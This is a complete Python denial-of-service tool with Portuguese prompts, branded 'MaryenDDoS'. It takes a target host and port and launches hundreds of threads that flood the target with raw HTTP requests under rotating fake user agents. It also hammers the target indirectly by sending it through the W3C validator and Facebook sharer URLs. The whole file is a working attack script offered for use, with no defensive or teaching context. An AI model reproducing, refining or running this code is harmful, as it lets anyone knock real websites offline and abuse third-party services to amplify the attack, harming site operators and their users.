#!/usr/bin/python3
# -*- coding: utf-8 -*-


from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random

headers_X = '''Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-us,en;q=0.5\nAccept-Encoding: gzip,deflate\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\nKeep-Alive: 115\nConnection: keep-alive'''



def none_X():
   print ("\n\n\033[31m [#]=> OPÇÃO INVALIDA ! TENTE NOVAMENTE ...\n\n")


print(''' \033[1;36m
 ███╗   ███╗ █████╗ ██████╗ ██╗   ██╗███████╗███╗   ██╗
 ████╗ ████║██╔══██╗██╔══██╗╚██╗ ██╔╝██╔════╝████╗  ██║
 ██╔████╔██║███████║██████╔╝ ╚████╔╝ █████╗  ██╔██╗ ██║
 ██║╚██╔╝██║██╔══██║██╔══██╗  ╚██╔╝  ██╔══╝  ██║╚██╗██║
 ██║ ╚═╝ ██║██║  ██║██║  ██║   ██║   ███████╗██║ ╚████║
 ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═══╝
                                      SECURITY ™

\033[1;32m
 [#]=> Escolha um tipo de DDoS que você deseja!
\033[33m
 [ 1 ]=> SIMPLES\033[1;37m (min: 1gb de ram/internet fraca)\033[1;35m
 [ 2 ]=> MEDIUM\033[1;37m  (min: 1gb de ram/internet boa  )\033[1;31m
 [ 3 ]=> EXPERT\033[1;37m  (min: 2gb de ram/internet top  )\033[1;34m''')

tipo_X = input("\n\033[1;34m [?]=> Escolha uma opção :\033[1;37m ")
if tipo_X == "1":
   tipoX = (130)
elif tipo_X == "2":
   tipoX = (250)
elif tipo_X == "3":
   tipoX = (500)
else:
   none_X()
   sys.exit()

host = input("\n\033[34m [!]=> Digite o host :\033[37m ")
port = input("\n\033[34m [!]=> Digite a porta:\033[37m ")


def criar_headers():
   arq = open("/sdcard/Android/headers.txt", "w")
   arq.write(headers_X)
   arq.close()

def user_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	return(uagent)


def my_bots():
	global bots
	bots=[]
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	return(bots)


def bot_hammering(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			print("\033[94m  [✓]=> MaryenDDoS <=[✓]\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)


def down_it(item):
	try:
		while True:
			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,int(port)))
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[96m  [✓]=> MaryenDDoS <=[✓]\033[0m")
			else:
				s.shutdown(1)
				print("\033[91m  [#]=> ............... \033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91m  [!]=> Conexão lenta !!!\033[0m")
		time.sleep(.1)


def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()


def dos2():
	while True:
		item=w.get()
		bot_hammering(random.choice(bots)+"http://"+host)
		w.task_done()
criar_headers()

headers = open("/sdcard/Android/headers.txt", "r")
data = headers.read()
headers.close()


q = Queue()
w = Queue()


if __name__ == '__main__':
	if len(sys.argv) < 2:
	   print("\033[92m\n\n [#]=> Iniciando DDoS em => \033[31m" + host + "\033[32m , Porta => \033[31m" + port + " \033[0m")
	user_agent()
	my_bots()
	time.sleep(5)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,int(port)))
		s.settimeout(1)
	except socket.error as e:
		print("\033[91m  [#]=> Verifique o host/porta do site ! \033[0m")
		sys.exit()
	while True:
		for i in range(tipoX):
			t = threading.Thread(target=dos)
			t.daemon = True
			t.start()
			t2 = threading.Thread(target=dos2)
			t2.daemon = True
			t2.start()
		start = time.time()
		item = 0
		while True:
			if (item>1800):
				item=0
				time.sleep(.1)
			item = item + 1
			q.put(item)
			w.put(item)
		q.join()
		w.join()
